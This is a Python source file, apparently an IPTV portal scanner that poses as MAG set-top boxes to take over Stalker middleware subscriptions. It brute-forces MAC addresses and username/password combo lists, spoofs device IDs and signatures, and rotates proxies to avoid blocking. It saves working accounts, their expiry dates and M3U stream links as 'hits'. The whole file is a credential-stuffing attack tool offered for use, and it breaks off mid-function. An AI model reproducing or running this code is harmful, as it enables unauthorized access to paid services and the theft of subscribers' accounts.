


import datetime
import os
import subprocess
import time
import hashlib
import urllib.parse
import re
import sys
import requests
import threading
import random
import string
from urllib3.exceptions import InsecureRequestWarning
from datetime import date

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"





class AppState:
    def __init__(self):
        self.cpm = 0
        self.hitr = 0
        self.m3uon = 0
        self.m3uvpn = 0
        self.macon = 0
        self.macvpn = 0
        self.hit = 0
        self.hitr_str = "\33[1;33m"
        self.tokenr = "\33[0m"
        self.oran = ""
        self.kanalkata = "2"
        self.stalker_portal = "feyzo"
        self.hitsay = 0
        self.say = 1
        self.comboc = ""
        self.combototLen = ""
        self.combouz = 0
        self.combodosya = ""
        self.proxyc = ""
        self.proxytotLen = ""
        self.proxydosya = ""
        self.proxyuz = 0
        self.randommu = ""
        self.proxi = ""
        self.ses = requests.Session()
        self.combosay = 0
        self.proxysay = 0
        self.panel = ""
        self.uzmanm = ""
        self.http = "http"
        self.realblue = ""
        self.pro = ""
        self.randomturu = ""
        self.mactur = ""
        self.serim = ""
        self.seri = ""
        self.k = 0
        self.jj = 0
        self.iii = 0
        self.genmacs = ""
        self.bib = 0
        self.custom_mac_mode = False
        self.nickn = ""
        self.Dosyab = ""
        self.auth_method = ""
        self.creds_scanned = 0
        self.total_creds = 0
        self.cred_random_pattern = ""
        self.yeninesil = (
            '00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 
            'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '11:33:01:',
            '00:1C:19:', '1A:00:6A:', '1A:00:FB:', '00:A1:79:',
            '00:1B:79:', '00:2A:79:'
        )
        self.pattern = "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
        self.counters = Counters()

class Counters:
    def __init__(self):
        self.lock = threading.Lock()
        self.macs_scanned = 0
        self.total_macs_to_scan = 0
        self.hit = 0
        self.custom_macs = []
        self.custom_mac_index = 0
        self.cpm = 0
        self.panels = []
        self.current_panel_index = 0
        self.creds_scanned = 0
        self.total_creds = 0
        self.credentials = []
        self.cred_index = 0
        self.random_cred_index = 0
        
    def get_next_custom_mac(self):
        with self.lock:
            if self.custom_mac_index >= len(self.custom_macs):
                return None
            mac = self.custom_macs[self.custom_mac_index]
            self.custom_mac_index += 1
            return mac
            
    def get_next_panel(self):
        with self.lock:
            if not self.panels:
                return None
            if self.current_panel_index >= len(self.panels):
                self.current_panel_index = 0
            panel = self.panels[self.current_panel_index]
            self.current_panel_index += 1
            return panel
            
    def get_next_credential(self):
        with self.lock:
            if self.cred_index >= len(self.credentials):
                return None
            cred = self.credentials[self.cred_index]
            self.cred_index += 1
            self.creds_scanned += 1
            return cred
            
    def get_next_random_credential(self, pattern):
        with self.lock:
            if self.random_cred_index >= self.total_creds:
                return None
            self.random_cred_index += 1
            return generate_random_credential(pattern)
            
    def increment_hit(self):
        with self.lock:
            self.hit += 1
            
    def increment_m3uvpn(self, state):
        with self.lock:
            state.m3uvpn += 1
            
    def increment_m3uon(self, state):
        with self.lock:
            state.m3uon += 1
            
    def increment_macvpn(self, state):
        with self.lock:
            state.macvpn += 1
            
    def increment_macon(self, state):
        with self.lock:
            state.macon += 1
            
    def update_cpm(self, new_cpm):
        with self.lock:
            self.cpm = new_cpm

def generate_random_credential(pattern):
    try:
        if 'x' in pattern:
            user_len, pass_len = map(int, pattern.split('x'))
            username = ''.join(random.choices(string.ascii_letters + string.digits, k=user_len))
            password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=pass_len))
            return (username, password)
        else:
            username = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=8))
            return (username, password)
    except:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=8))
        return (username, password)



def bekle(state, bib, vr):
    i = bib
    animation = [
        "[■□□□□□□□□□□□□□□]", "[■■□□□□□□□□□□□□□]", "[■■■□□□□□□□□□□□□]", 
        "[■■■■□□□□□□□□□□□]", "[■■■■■□□□□□□□□□□]", "[■■■■■■□□□□□□□□□]", 
        "[■■■■■■■□□□□□□□□]", "[■■■■■■■■□□□□□□□]", "[■■■■■■■■■□□□□□□]", 
        "[■■■■■■■■■■□□□□□]", "[■■■■■■■■■■■□□□□]", "[■■■■■■■■■■■■□□□]",
        "[■■■■■■■■■■■■■□□]", "[■■■■■■■■■■■■■■□]", "[■■■■■■■■■■■■■■■]"
    ]
    
    time.sleep(0.2)
    sys.stdout.write("\r" + animation[i % len(animation)] + 'CheckingProxies')
    sys.stdout.flush()
    if vr == "xdeep":
        time.sleep(0.2)
        sys.stdout.write("\r" + animation[i % len(animation)] + 'Xdeep')
        sys.stdout.flush()
    if vr == "proxy":
        time.sleep(0.2)
        sys.stdout.write("\r" + animation[i % len(animation)] + 'Proxy')
        sys.stdout.flush()
    if state .bib == 15:
        sys.stdout.write("\r" + ' ' * 30 + "\r")
        sys.stdout.flush()
        time.sleep(0.2)

def echok(state, mac, bot, total, hitc, oran, panel, auth_type="MAC"):
    state.bib = 0
    cpmx = (time.time() - state.cpm)
    if cpmx > 0:
        cpmx = (round(60 / cpmx))
    else:
        cpmx = 0
    
    if auth_type == "MAC":
        identifier = f"{state.tokenr}{mac}"
        scan_type = f"Mac➩ \33[92mON★{state.macon} \33[0m◉\33[35mVPN★{state.macvpn}"
    else:
        identifier = f"{state.tokenr}USER:{mac}" if len(mac) > 15 else f"{state.tokenr}{mac}"
        scan_type = f"Cred➩ \33[92mON★{state.macon} \33[0m◉\33[35mVPN★{state.macvpn}"
    
    echo = f"""
╭──➢  \33[1;97;100m ᴘᴀɴᴇʟᴘᴏʀᴛ ➩ {panel} \33[0m
├─◉ {identifier}  \33[0m\33[1;94mCPM➢{cpmx} \33[0m 
├──◉ \33[1;33m Bot{bot}  \33[36mTotal➢{total}  \33[0m{state.hitr_str}🄷🄸🅃➢{hitc}   \33[0m \33[1;31m%{oran}   \33[0m
╰─◉ {scan_type} \33[0mM3U➩ \33[92mON★{state.m3uon} \33[0m◉\33[91mOFF★{state.m3uvpn}   \33[0m"""
    
    print(echo)
    state.cpm = time.time()
    return cpmx

def device(state, mac):
    mac = mac.lower()
    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
    SNENC = SN.upper()
    SNCUT = SNENC[:13]
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
    DEVENC = DEV.upper()
    DEV1 = hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
    DEVENC1 = DEV1.upper()
    SG = SNCUT + '+' + (mac)
    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
    SINGENC = SING.upper()
    
    sifre = f"""
╭─➤🅳🅴🆅🅸🅲🅴👻🅸🅽🅵🅾︎
├●🗝️𝗦𝗲𝗿𝗶𝗮𝗹➤ {SN}   
├●🗝️𝗦𝗲𝗿𝗶𝗮𝗹𝗖𝘂𝘁➤ {SNCUT}
├●🆔𝗗𝗲𝘃𝗶𝗰𝗲𝗜𝗗𝟭➤ {DEVENC}
├●🆔𝗗𝗘𝗩𝗜𝗖𝗘𝗜𝗗𝟮➤ {SINGENC}
├●📝𝗦𝗶𝗴𝗻𝗮𝘁𝘂𝗿𝗲➤ {DEVENC1}
╰─●👽𝗛𝗶𝘁𝘀𝗕𝘆 {state.nickn}"""
    
    return sifre

def yax(state, hits):
    try:
        dosya = open(state.Dosyab, 'a+', encoding='utf-8') 
        dosya.write(hits)
        dosya.close()
    except Exception as e:
        print(f"Error writing to file: {e}")

def hityaz(state, mac, trh, real, m3ulink, m3uimage, durum, vpn, playerapi, categories, panel, auth_type="MAC"):
    panell = panel
    reall = real
    
    simza = ""
    if state.uzmanm == "stalker_portal/server/load.php":
        panell = str(panel) + '/stalker_portal'
        reall = real.replace('/c/', '/stalker_portal/c/')
        simza = f"""
╭─➢🆂🆃🅰🅻🅺🅴🆁👺🅸🅽🅵🅾
├⟢Real URL ➤{reall}"""
    
    if auth_type == "MAC":
        auth_header = f"""
╭─➤🅸🅿🆃🆅💀🆂🅲🅰🅽🅽🅴🆁
├◉𝗦𝗰𝗮𝗻𝗕𝘆 ➤ {state.nickn}
├◉𝗦𝗰𝗮𝗻𝗗𝗮𝘁𝗲 ➤{time.strftime('%d-%m-%Y')}
├◉𝗥𝗲𝗮𝗹 ➤ {reall}
├◉𝗣𝗼𝗿𝘁𝗮𝗹 ➤ http://{panell}/c/
├◉𝗣𝗼𝗿𝘁𝗮𝗹𝗧𝘆𝗽𝗲 ➤ {state.uzmanm}
├◉𝗠𝗮𝗰 ➤ {mac}
├◉𝗘𝘅𝗽 ➤ {trh}
╰─◉𝗛𝗶𝘁𝘀𝗕𝘆 {state.nickn}"""
    else:
        auth_header = f"""
╭─➤🅸🅿🆃🆅💀🆂🅲🅰🅽🅽🅴🆁
├◉𝗦𝗰𝗮𝗻𝗕𝘆 ➤ {state.nickn}
├◉𝗦𝗰𝗮𝗻𝗗𝗮𝘁𝗲 ➤{time.strftime('%d-%m-%Y')}
├◉𝗥𝗲𝗮𝗹 ➤ {reall}
├◉𝗣𝗼𝗿𝘁𝗮𝗹 ➤ http://{panell}/c/
├◉𝗣𝗼𝗿𝘁𝗮𝗹𝗧𝘆𝗽𝗲 ➤ {state.uzmanm}
├◉𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 ➤ {mac}
├◉𝗘𝘅𝗽 ➤ {trh}
╰─◉𝗛𝗶𝘁𝘀𝗕𝘆 {state.nickn}"""
        
    imza = auth_header + f"""
╭➤🅲🅷🅰🅽🅽🅴🅻👁️🅲🅷🅴🅲🅺
├▣𝗠𝗮𝗰 ➤ {durum}
├▣𝗺𝟯𝘂 ➤ {m3uimage}
╰─▣𝗩𝗽𝗻 ➤ {vpn} {playerapi}"""

    if auth_type == "MAC":
        sifre = device(state, mac)
        imza = imza + sifre
    
    pimza = f"""
╭─➤🅸🅿🆃🆅💀🆂🅲🅰🅽🅽🅴🆁
╰─◉𝗺𝟯𝘂𝗹𝗶𝗻𝗸➤ {m3ulink}"""
        
    imza = imza + simza + pimza
        
    if state.kanalkata == "1" or state.kanalkata == "2":
        imza = imza + f""" 
╭─◉🅻🅸🆅🅴🅻🅸🆂🆃─○○
╰─➤{categories.get('live', 'N/A')}"""
        
    if state.kanalkata == "2":
        imza = imza + f"""  
╭─◉🆅🅾🅳🅻🅸🆂🆃─○○
╰─➤{categories.get('vod', 'N/A')} 
╭─◉🆂🅴🆁🅸🅴🆂🅻🅸🆂🆃─○○
╰─➤{categories.get('series', 'N/A')}"""
        
    yax(state, imza)
    state.hitsay = state.hitsay + 1
    print(imza)
        
    if state.hitsay >= state.hit:
        state.hitr_str = "\33[1;33m"

def get_categories(state, mac, token, panel):
    categories = {'live': 'N/A', 'vod': 'N/A', 'series': 'N/A'}
    
    try:
        live_url = f"{state.http}://{panel}/{state.uzmanm}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        res = state.ses.get(live_url, headers=hea2(state, mac, token, panel), timeout=3, verify=False)
        if res.status_code == 200:
            categories['live'] = "Available"
    except:
        pass
        
    try:
        vod_url = f"{state.http}://{panel}/{state.uzmanm}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        res = state.ses.get(vod_url, headers=hea2(state, mac, token, panel), timeout=3, verify=False)
        if res.status_code == 200:
            categories['vod'] = "Available"
    except:
        pass
        
    try:
        series_url = f"{state.http}://{panel}/{state.uzmanm}?type=series&action=get_categories&JsHttpRequest=1-xml"
        res = state.ses.get(series_url, headers=hea2(state, mac, token, panel), timeout=3, verify=False)
        if res.status_code == 200:
            categories['series'] = "Available"
    except:
        pass
        
    return categories

def test_channel(state, cid, user, pas, plink):
    try:
        url = f"{state.http}://{plink}/live/{user}/{pas}/{cid}.ts"
        res = state.ses.get(url, headers=hea3(state), timeout=(2, 5), allow_redirects=False, stream=True)
        return res.status_code == 302
    except:
        return False

def m3ugoruntu(state, cid, user, pas, plink):
    try:
        url = f"{state.http}://{plink}/live/{user}/{pas}/{cid}.ts"
        res = state.ses.get(url, headers=hea3(state), timeout=(2, 5), allow_redirects=False, stream=True)
        return "🅸🅼🅰🅶🅴 ✅" if res.status_code == 302 else "🅽🅾 🅸🅼🅰🅶🅴 🚫"
    except:
        return "🅽🅾 🅸🅼🅰🅶🅴 🚫"

def m3uapi(state, playerlink, mac, token, panel):
    try:
        res = state.ses.get(playerlink, headers=hea2(state, mac, token, panel), timeout=3, verify=False)
        veri = str(res.text)
        
        if 'user_info' in veri:
            return "Active Account"
        else:
            return "Inactive Account"
    except:
        return "API Error"

def goruntu(state, link, cid):
    try:
        res = state.ses.get(link, headers=hea3(state), timeout=10, allow_redirects=False, stream=True)
        return "🆅🅿🅽 🅸🅼🅰🅶🅴 ✅" if res.status_code == 302 else "🆅🅿🅽 🅸🅼🅰🅶🅴 ❌"
    except:
        return "🆅🅿🅽 🅸🅼🅰🅶🅴 ❌"

def url7(state, cid, panel):
    url = f"{state.http}://{panel}/{state.uzmanm}?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/{cid}_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
    
    if state.uzmanm == "stalker_portal/server/load.php":
        url = f"{state.http}://{panel}/{state.uzmanm}?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/{cid}_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"

def hea3(state, panel=None, mac=None):
    if panel is None:
        panel = state.panel
    
    return {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100", 
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }

def hitecho(state, mac, trh):
    try:
        sesdosya = os.path.join(os.getcwd(), "hit.mp3")
    except:
        pass
        
    print(f"""
{state.panel}
{mac}
{trh}
""")

def unicode(fyz):
    try:
        return fyz.encode('utf-8').decode("unicode-escape").replace('\/', '/')
    except:
        return fyz

def duzel2(veri, vr):
    try:
        data = veri.split('"' + str(vr) + '":"')[1]
        data = data.split('"')[0]
        data = data.replace('"', '')
        data = data.replace('\\', '')
        data = data.replace('/', '')
        data = data.replace(' ', '')
        data = data.replace('(', '')
        data = data.replace(')', '')
        return unicode(data)
    except:
        return ""
    

def duzelt1(veri, vr):
    try:
        data = veri.split(str(vr) + '":"')[1]
        data = data.split('"')[0]
        data = data.replace('"', '')
        data = data.replace('\\', '')
        data = data.replace('/', '')
        data = data.replace(' ', '')
        data = data.replace('(', '')
        data = data.replace(')', '')
        return data
    except:
        return ""

def month_string_to_number(ay):
    m = {
        'jan': 1, 'feb': 2, 'mar': 3, 'apr': 4, 'may': 5, 'jun': 6,
        'jul': 7, 'aug': 8, 'sep': 9, 'oct': 10, 'nov': 11, 'dec': 12
    }
    
    s = ay.strip()[:3].lower()
    return m.get(s, 1)

def tarih_clear(trh):
    try:
        if ' ' in trh and ',' in trh:
            ay = str(trh.split(' ')[0])
            gun = str(trh.split(', ')[0].split(' ')[1])
            yil = str(trh.split(', ')[1])

            ay_num = month_string_to_number(ay)
            
            d = date(int(yil), ay_num, int(gun))
            sontrh = time.mktime(d.timetuple())
            return int((sontrh - time.time()) / 86400)
        else:
            return "N/A"
    except:
        return "N/A"
    

def combogetir(state):
    if state.comboc != "1":
        return None
    state.combosay += 1
    
    try:
        return state.combototLen[state.combosay] if state.combosay < len(state.combototLen) else None
    
    except:
        return None

def proxygetir(state):
    if state.proxi != "1":
        return {}
        
    state.bib += 1
    bekle(state, state.bib, "xdeep")
    
    if state.bib == 15:
        state.bib = 0
        
    try:
        state.proxysay += 1
        if state.proxysay >= state.proxyuz:
            state.proxysay = 0
            
        proxygeti = state.proxytotLen[state.proxysay]
        pveri = proxygeti.replace('\n', '')
        
        parts = pveri.split(':')
        if len(parts) < 2:
            return {}
            
        pip, pport = parts[0], parts[1]
        
        if state.pro == "1" and len(parts) >= 4:
            pname, ppass = parts[2], parts[3]
            return {
                'http': f'socks5://{pname}:{ppass}@{pip}:{pport}',
                'https': f'socks5://{pname}:{ppass}@{pip}:{pport}'
            }
        elif state.pro == "2":
            return {
                'http': f'socks4://{pip}:{pport}',
                'https': f'socks4://{pip}:{pport}'
            }
        elif state.pro == "3":
            return {
                'http': f'socks5://{pip}:{pport}',
                'https': f'socks5://{pip}:{pport}'
            }
        elif state.pro == "4":
            return {
                'http': f'http://{pip}:{pport}',
                'https': f'https://{pip}:{pport}'
            }
        else:
            return {}
    except:
        return {}

def hea1(state, panel, mac):
    macs = urllib.parse.quote(mac.lower())
    panell = panel
    
    if state.uzmanm == "stalker_portal/server/load.php":
        panell = f"{panel}/stalker_portal"
        
    return {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
        "Referer": f"{state.http}://{panell}/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe%2FParis;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }

def hea2(state, mac, token, panel):
    macs = urllib.parse.quote(mac.lower())
    panell = panel
    
    if state.uzmanm == "stalker_portal/server/load.php":
        panell = f"{panel}/stalker_portal"
        
    headers = hea1(state, panel, mac)
    headers["Authorization"] = f"Bearer {token}"
    return headers

def url2(state, mac, random_val, panel):
    macs = urllib.parse.quote(mac.lower())
    SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
    SNENC = SN.upper()
    SNCUT = SNENC[:13]
    SNLEN = len(SNENC)
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
    
    DEVENC = DEV.upper()
    
    if state.uzmanm == "stalker_portal/server/load.php":
        times = time.time()
        return f"{state.http}://{panel}/{state.uzmanm}?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn={SNCUT}&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id={DEVENC}&device_id2={DEVENC}&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22{macs}%22%2C%22sn%22%3A%22{SNCUT}%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22{random_val}%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp={times}&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml"
    else:
        return f"{state.http}://{panel}/{state.uzmanm}?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"

def randommac(state):
    if state.randomturu == '2':
        while True:
            genmac = f"{state.mactur}{random.randint(0, 255):02x}:{random.randint(0, 255):02x}:{random.randint(0, 255):02x}"
            if genmac not in state.genmacs:
                state.genmacs += f' {genmac}'
                return genmac.lower()
    else:
        if state.iii >= 256:
            state.iii = 0
            state.jj += 1
            
        if state.jj >= 256:
            state.jj = 0
            state.k += 1
            
        if state.k >= 256:
            return None
            
        genmac = f"{state.mactur}{state.k:02x}:{state.jj:02x}:{state.iii:02x}"
        state.iii += 1
        
        if state.serim == "1":
            if len(state.seri) == 1:
                genmac = genmac.replace(genmac[:10], f"{state.mactur}{state.seri}")
            elif len(state.seri) == 2:
                genmac = genmac.replace(genmac[:11], f"{state.mactur}{state.seri}")
                
        return genmac.lower().replace(':100', ':10')

def temizle():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_panels_from_file(file_path):
    panels = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    panels.append(line)
        return panels
    except Exception as e:
        print(f"Error loading panels from file: {e}")
        return []

def validate_mac(state, mac):
    mac = mac.strip()
    
    if re.match(state.pattern, mac, re.IGNORECASE):
        if ':' not in mac:
            mac = ':'.join([mac[i:i+2] for i in range(0, len(mac), 2)])
        return mac.lower()
    
    match = re.search(state.pattern, mac, re.IGNORECASE)
    if match:
        return match.group(1).lower()
    
    return None

def load_credentials_from_file(file_path):
    credentials = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            credentials.append((parts[0], parts[1]))
        return credentials
    except Exception as e:
        print(f"Error loading credentials from file: {e}")
        return []

def dosyasec(state):
    current_dir = os.getcwd()
    
    if state.comboc != "proxy":
        if state.auth_method == "1":
            mesaj = "Mac Combo List, Combo select..!\nSelect the file with the Mac Combo"
            dir_path = os.path.join(current_dir, "combo")
            dsy = "\n       0=⫸ Random (OTO MAC)\n"
        else:
            mesaj = "Credentials List, Combo select..!\nSelect the file with username:password combos"
            dir_path = os.path.join(current_dir, "creds")
            dsy = "\n       0=⫸ Random Credentials\n"
    else:
        mesaj = "Proxy Combo select..!\nSelect the combo where it is the proxy"
        dir_path = os.path.join(current_dir, "proxy")
        dsy = ""
    
    if not os.path.exists(dir_path):
        os.makedirs(dir_path)
    
    files_list = []
    for files in os.listdir(dir_path):
        if files.endswith('.txt'):
            files_list.append(files)
    
    for i, file in enumerate(files_list, 1):
        dsy += f"{i}=⫸ {file}\n"
    
    print(f"Combo Files, Select Number\nChoose your combo from the list below!!\n\n{dsy}")
    
    try:
        dsyno = int(input(f"\33[31m{mesaj}\nCombo No = \33[0m"))
    except:
        dsyno = 0
    
    if state.comboc != "proxy":
        if state.auth_method == "1":
            if dsyno == 0:
                temizle()
                for xd, prefix in enumerate(state.yeninesil, 1):
                    tire = '   》' if xd < 10 else '  》'
                    print(f"{xd}{tire}{prefix}")
                
                try:
                    mactur_input = int(input("\nSelect mac type!\n\nAnswer = ")) - 1
                    state.mactur = state.yeninesil[mactur_input]
                except:
                    state.mactur = state.yeninesil[0]
                    
                state.randomturu = input("""
    Select mac combination type!

    1 - For cascading mac
    2 - For random mac
            
    Mac type = """)
                
                if state.randomturu not in ["1", "2"]:
                    state.randomturu = "2"
                        
                state.serim = input("""
    Use serial mac?

    1 - Yes
    2 - No
            
    Answer = """)
                    
                if state.serim == "1":
                    state.seri = input(f"Sample={state.mactur}5\nSample={state.mactur}Fa\nWrite one or two values!!!\n{state.mactur}")
                        
                try:
                    state.combouz = int(input("""
    Type the number of macs to scan?
            
    Number of macs = """))
                except:
                    state.combouz = 30000
                    
                state.randommu = "xdeep"
                state.comboc = 'feyzo'
            else:
                try:
                    dosya = os.path.join(dir_path, files_list[dsyno - 1])
                    with open(dosya, 'r', encoding='utf-8') as f:
                        state.combototLen = f.readlines()
                    
                    valid_macs = []
                    for line in state.combototLen:
                        line = line.strip()
                        if line:
                            match = re.search(state.pattern, line, re.IGNORECASE)
                            if match:
                                valid_macs.append(match.group(1).lower())
                            else:
                                print(f"Warning: Invalid MAC format skipped: {line}")
                    
                    if not valid_macs:
                        print("No valid MAC addresses found in the file!")
                        exit()
                    
                    state.counters.custom_macs = valid_macs
                    state.combouz = len(state.counters.custom_macs)
                    state.custom_mac_mode = True
                    print(f"Loaded {state.combouz} valid MAC addresses from file")
                    
                except Exception as e:
                    print(f"Error reading file: {e}")
                    exit()
        else:
            if dsyno == 0:
                print("\nSelect credential pattern:")
                patterns = ["5x5", "6x6", "7x7", "8x8", "9x9", "10x10", "11x11", "12x12"]
                for i, pattern in enumerate(patterns, 1):
                    print(f"{i}=⫸ {pattern}")
                
                try:
                    pattern_choice = int(input("\nPattern No = "))
                    state.cred_random_pattern = patterns[pattern_choice - 1]
                except:
                    state.cred_random_pattern = "8x8"
                
                try:
                    state.combouz = int(input("""
    Type the number of credentials to generate?
            
    Number of credentials = """))
                except:
                    state.combouz = 10000
                    
                state.counters.total_creds = state.combouz
                print(f"Will generate {state.combouz} random credentials with pattern {state.cred_random_pattern}")
            else:
                try:
                    dosya = os.path.join(dir_path, files_list[dsyno - 1])
                    state.counters.credentials = load_credentials_from_file(dosya)
                    state.counters.total_creds = len(state.counters.credentials)
                    if state.counters.total_creds == 0:
                        print("No valid credentials found in the file!")
                        exit()
                    print(f"Loaded {state.counters.total_creds} credentials from file")
                except Exception as e:
                    print(f"Error reading file: {e}")
                    exit()
    else:
        try:
            dosya = os.path.join(dir_path, files_list[dsyno - 1])
            with open(dosya, 'r', encoding='utf-8') as f:
                state.proxytotLen = f.readlines()
            state.proxyuz = len(state.proxytotLen)
        except:
            print("Invalid file selection")
            exit()

def authenticate_with_credentials(state, username, password, panel):
    try:
        auth_url = f"{state.http}://{panel}/{state.uzmanm}?type=login&username={username}&password={password}&JsHttpRequest=1-xml"
        res = state.ses.get(auth_url, headers=hea3(state, panel, "dummy_mac"), timeout=3)
        veri = str(res.text)
        
        if 'token":"' not in veri:
            return None, None
            
        token = veri.split('token":"')[1].split('"')[0]
        
        url = f"{state.http}://{panel}/{state.uzmanm}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        res = state.ses.get(url, headers=hea2(state, "dummy_mac", token, panel), timeout=3)
        veri = str(res.text)
        
        if veri.count('phone') == 0 and veri.count('end_date') == 0:
            return None, None
            
        trh = ""
        if "phone" in veri:
            trh = veri.split('phone":"')[1].split('"')[0]
        if "end_date" in veri:
            trh = veri.split('end_date":"')[1].split('"')[0]
            
        try:
            trh = datetime.datetime.fromtimestamp(int(trh)).strftime('%b %d, %Y, %I:%M %p')
        except:
            pass
            
        return token, trh
        
    except Exception as e:
        print(f"Authentication error: {e}")
        return None, None

def XD(state, bot_id):
    ses = requests.Session()
    
    while True:
        if state.auth_method == "1":
            if state.custom_mac_mode:
                mac = state.counters.get_next_custom_mac()
                if mac is None:
                    break
                validated_mac = validate_mac(state, mac)
                if not validated_mac:
                    print(f"Invalid MAC format: {mac}")
                    continue
                mac = validated_mac
                scanned = state.counters.custom_mac_index
                total = len(state.counters.custom_macs)
            else:
                with state.counters.lock:
                    if state.counters.macs_scanned >= state.counters.total_macs_to_scan:
                        break
                    state.counters.macs_scanned += 1
                    scanned = state.counters.macs_scanned
                mac = randommac(state)
                if mac is None:
                    break
                total = state.counters.total_macs_to_scan
                
            current_panel = state.counters.get_next_panel()
            if not current_panel:
                break
            
            oran = round((scanned / total * 100), 2) if total > 0 else 0
            new_cpm = echok(state, mac, bot_id, total, state.counters.hit, oran, current_panel, "MAC")
            state.counters.update_cpm(new_cpm)
            
            try:
                proxy = proxygetir(state)
                
                url = f"{state.http}://{current_panel}/{state.uzmanm}?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
                res = ses.get(url, headers=hea3(state, current_panel, mac), timeout=3, proxies=proxy)
                veri = str(res.text)
                
                if not 'token":"' in veri:
                    continue
                    
                token = veri.split('token":"')[1].split('"')[0]
                
                url = f"{state.http}://{current_panel}/{state.uzmanm}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                res = ses.get(url, headers=hea2(state, mac, token, current_panel), timeout=3, proxies=proxy)
                veri = str(res.text)
                
                if veri.count('phone') == 0 and veri.count('end_date') == 0:
                    continue
                    
                trh = ""
                if "phone" in veri:
                    trh = veri.split('phone":"')[1].split('"')[0]
                if "end_date" in veri:
                    trh = veri.split('end_date":"')[1].split('"')[0]
                    
                try:
                    trh = datetime.datetime.fromtimestamp(int(trh)).strftime('%b %d, %Y, %I:%M %p')
                except:
                    pass
                    
                hitecho(state, mac, trh)
                    
                cid = "1842"
                user, pas, real = "test", "test", current_panel
                
                url = f"{state.http}://{current_panel}/{state.uzmanm}?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
                res = ses.get(url, headers=hea2(state, mac, token, current_panel), timeout=3, proxies=proxy)
                veri = str(res.text)
                
                if 'total' in veri:
                    cid = veri.split('ch_id":"')[5].split('"')[0]
                    
                url = url7(state, cid, current_panel)
                res = ses.get(url, headers=hea2(state, mac, token, current_panel), timeout=3, proxies=proxy)
                veri = str(res.text)
                
                link = ""
                if 'ffmpeg ' in veri:
                    link = veri.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                    user = link.replace('live/', '').split('/')[3]
                    pas = link.replace('live/', '').split('/')[4]
                    real = 'http://' + link.split('://')[1].split('/')[0] + '/c/'
                    
                m3ulink = f"http://{real.replace('http://', '').replace('/c/', '')}/get.php?username={user}&password={pas}&type=m3u_plus"
                playerlink = f"http://{real.replace('http://', '').replace('/c/', '')}/player_api.php?username={user}&password={pas}"
                plink = real.replace('http://', '').replace('/c/', '')
                
                categories = get_categories(state, mac, token, current_panel)
                
                channel_working = test_channel(state, cid, user, pas, plink)
                durum = "CHANNEL ✅" if channel_working else "CHANNEL ❌"
                
                m3uimage = m3ugoruntu(state, cid, user, pas, plink)
                
                vpn = goruntu(state, link, cid) if link else "N/A"
                
                playerapi = m3uapi(state, playerlink, mac, token, current_panel)
                
                state.counters.increment_hit()
